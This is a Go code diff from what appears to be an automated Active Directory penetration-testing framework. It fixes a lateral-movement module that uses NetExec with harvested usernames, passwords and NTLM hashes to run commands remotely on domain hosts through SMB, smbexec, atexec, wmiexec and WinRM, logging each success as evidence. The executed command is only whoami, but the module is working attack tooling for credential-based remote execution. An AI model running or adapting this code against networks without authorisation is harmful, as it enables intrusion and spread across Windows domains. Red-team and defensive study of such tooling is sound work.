@@ -15,7 +15,8 @@ type protocolCheck struct {
 	Name     string
 	Protocol string
 	Port     int
-	Command  string
+	Subcmd   string
+	Extra    []string
 }
 
 func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
@@ -36,11 +37,11 @@ func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
 	}
 
 	protocols := []protocolCheck{
-		{"SMB", "smb", 445, "whoami"},
-		{"PSExec", "smb", 445, "psexec whoami"},
-		{"Schtasks", "smb", 445, "schtasks whoami"},
-		{"WMI", "smb", 445, "wmi whoami"},
-		{"WinRM", "winrm", 5985, "whoami"},
+		{"SMB", "smb", 445, "-x", []string{"whoami"}},
+		{"PSExec", "smb", 445, "--exec-method", []string{"smbexec", "-x", "whoami"}},
+		{"Schtasks", "smb", 445, "--exec-method", []string{"atexec", "-x", "whoami"}},
+		{"WMI", "smb", 445, "--exec-method", []string{"wmiexec", "-x", "whoami"}},
+		{"WinRM", "winrm", 5985, "-x", []string{"whoami"}},
 	}
 
 	ctx := context.Background()
@@ -52,14 +53,14 @@ func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
 			Protocol: p.Protocol, Host: host.IP, Port: p.Port,
 			Domain: domain, Username: user, Password: pass, Hash: hash,
 		}
-		r, err := tools.NetExec.Run(ctx, target, "-x", []string{p.Command})
+		r, err := tools.NetExec.Run(ctx, target, p.Subcmd, p.Extra)
 		if err == nil && r.Success {
 			anySuccess = true
 			output := strings.TrimSpace(r.Stdout)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: "lateral_success", Phase: core.PhaseLateral,
 				Source: "netexec_" + p.Protocol, Key: host.IP,
-				Value: fmt.Sprintf("%s: %s", p.Name, output),
+				Value:     fmt.Sprintf("%s: %s", p.Name, output),
 				Timestamp: time.Now(),
 			})
 			fmt.Printf("  %s  %s succeeded\n", utils.SuccessStyle.Render("✓"), p.Name)
